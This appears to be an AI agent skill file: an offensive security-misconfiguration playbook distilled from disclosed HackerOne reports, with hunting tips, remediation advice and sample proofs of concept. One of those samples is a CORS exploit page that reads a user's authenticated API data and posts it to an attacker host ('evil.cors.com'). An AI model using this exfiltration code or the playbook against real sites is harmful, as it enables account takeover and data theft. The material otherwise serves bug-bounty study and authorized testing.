---
name: misconfiguration
description: "Security Misconfiguration offensive playbook from 40 disclosed HackerOne reports (4 critical, 8 high, 13 medium, 15 low). Use when hunting or reviewing security misconfiguration. Triggers: attacker, allowed, takeover, subdomain, link."
license: "For authorized security testing and education only."
---

# Security Misconfiguration

> Distilled from **40** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Insecure defaults or deploy mistakes  -  open buckets, debug endpoints, permissive CORS, default credentials, exposed admin panels, world-readable secrets.

## Where to hunt

- Scan for `.git`, backups, status/debug/actuator endpoints, default creds, public cloud storage, and `Access-Control-Allow-Origin: *` with credentials.
- Check staging/non-prod hosts that mirror production data with weaker controls.

## Exploitation playbook

- Pull source/secrets from exposed storage or debug pages; use default admin creds; abuse CORS to read authenticated responses cross-origin.

## Bypass techniques

- Alternate hostnames, IP access, forgotten subdomains, old versions still deployed.

## Impact & escalation

- Secret/source leak → auth bypass or RCE; open admin panel → full compromise.

## Remediation

- Hardened defaults, remove debug in prod, least-privilege CORS, rotate default secrets, inventory and lock down public assets.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#426165](https://hackerone.com/reports/426165)  -  [www.zomato.com] CORS Misconfiguration, could lead to disclosure of…
*medium, $550*

```http
GET /abudhabi HTTP/1.1
Host: www.zomato.com
Referer: https://www.zomato.com/
Cookie: zl=en; fbtrack=0c8f198276217196ed64230da7ec8506; _ga=GA1.2.1887254439.1538912146; _gcl_au=1.…
Origin: developersxzomato.com

## Response
```

### 2. [#426147](https://hackerone.com/reports/426147)  -  CORS misconfig | Account Takeover
*high*

```html
<html>
<body>
<button type='button' onclick='cors()'>CORS</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.cors.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://www.niche.co/api/v1/users/*******", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```

### 3. [#2262939](https://hackerone.com/reports/2262939)  -  Misconfiguration in AWS CloudFront CDN configuration makes rubygems…
*medium*

```xml
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<Error>
<Code>NoSuchBucket</Code>
<Message>The specified bucket does not exist</Message>
<BucketName>index.rubygems.org</BucketName>
<RequestId>KF8VDAZNXRZ3S9YQ</RequestId>
<HostId>MgMX9WXs1oJ0Rx8ABtxR+6UHFgVLyoqwqy/CRRPVMjlPLuSFdebn3E2L/8b7ZDL8QyF56JFL004=</HostId>
</Error>
```

### 4. [#2523654](https://hackerone.com/reports/2523654)  -  Subdomain takeover in Gitlab pages
*low*

```
HTTP/1.1 302 Found
content-type: text/html; charset=utf-8
location: https://projects.staging.gitlab.io/auth?domain=http://docs-dev.gitlab.com&state=giZFQTsOOFXvR_0po68zrg==
permissions-policy: interest-cohort=()
set-cookie: gitlab-pages=..._; Path=/auth; Expires=Tue, 28 May 2024 21:07:33 GMT; Max-Age=600; HttpOnly
vary: Origin
date: Tue, 28 May 2024 20:57:33 GMT
gitlab-lb: haproxy-pages-01-lb-gstg
gitlab-sv: pages-us-east1-c

HTTP/2 401 
content-type: text/html; charset=utf-8
permissions-policy: interest-cohort=()
vary: Origin
x-content-type-options: nosniff
content-length: 2872
date: Tue, 28 May 2024 20:57:34 GMT
```

## Recurring patterns in this dataset

Most frequent terms across the 40 reports (term (count)): `attacker` (19), `allowed` (12), `takeover` (12), `subdomain` (12), `link` (11), `misconfiguration` (9), `information` (9), `domain` (9), `content` (8), `discovered` (7), `access` (7), `disclosure` (6), `website` (6), `leading` (6), `cors` (5), `address` (5), `lead` (5), `graphql` (5)

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#838635](https://hackerone.com/reports/838635) | critical | $12,500 | line | Spring Actuator endpoints publicly available and broken authentication |
| [#862589](https://hackerone.com/reports/862589) | critical | $5,000 | line | Spring Actuator endpoints publicly available, leading to account takeover |
| [#1168104](https://hackerone.com/reports/1168104) | critical |  -  | gsa_vdp | Weak password policy leading to exposure of administrator account access |
| [#1398662](https://hackerone.com/reports/1398662) | critical |  -  | av | Мисконфигурация Cisco Smart Install |
| [#3113398](https://hackerone.com/reports/3113398) | high | $12,500 | security | Internal Access to Hackerone confluence Docs |
| [#928255](https://hackerone.com/reports/928255) | high |  -  | gitlab | Ability To Delete User(s) Account Without User Interaction |
| [#1634165](https://hackerone.com/reports/1634165) | high |  -  | stripe | Mass account takeover! |
| [#2106886](https://hackerone.com/reports/2106886) | high |  -  | mars | subdomain takeover at █████████ |

*See [reference.md](reference.md) for all 40 reports in this class.*
